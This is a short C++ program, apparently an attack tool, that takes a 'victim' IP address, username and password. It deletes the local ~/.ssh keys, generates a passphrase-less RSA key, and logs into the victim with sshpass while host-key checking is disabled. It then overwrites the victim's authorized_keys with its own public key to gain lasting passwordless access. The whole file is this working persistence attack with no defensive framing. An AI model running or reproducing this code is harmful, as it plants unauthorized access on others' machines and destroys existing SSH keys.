#include <bits/stdc++.h>
using namespace std;
void cmd(string s) {
    int ret = system(s.c_str());
    if (ret)
        cout << "\x1b[31mError\x1b[0m : ";
    else
        cout << "\x1b[32mAccept\x1b[0m: ";
    cout << s << '\n';
}
int main(int argc, char **argv) {
    if (argc < 4) {
        cout << "Usage: " << argv[0] << " <victim IP address> <username> <password>\n";
        return 0;
    }

    // generate key
    cmd("rm ~/.ssh/*");
    cmd("ssh-keygen -t rsa -N \"\" -f ~/.ssh/id_rsa");
    
    string ip_addr  = string(argv[1]);
    string username = string(argv[2]);
    string password = string(argv[3]);
    string ssh_prefix = "ssh "
        "-o IdentitiesOnly=yes "
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=~/.ssh/known_hosts " 
        + username + "@" + ip_addr;

    // login with password and set public key in victim
    cmd("cat ~/.ssh/id_rsa.pub | sshpass -p \'" + password + "\' " + ssh_prefix + " \'cat > ~/.ssh/authorized_keys\'");
    cmd(ssh_prefix + " \'chmod 600 ~/.ssh/authorized_keys\'");
}
